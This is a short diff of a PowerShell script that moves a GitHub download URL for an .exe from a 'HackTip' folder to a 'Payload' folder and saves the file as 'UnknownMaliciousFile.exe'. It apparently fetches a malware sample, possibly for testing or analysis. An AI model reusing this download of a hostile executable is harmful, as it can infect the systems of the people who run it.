@@ -1,4 +1,4 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/HackTip/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe'
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe'
 $output = "UnknownMaliciousFile.exe"
 $start_time = Get-Date
 
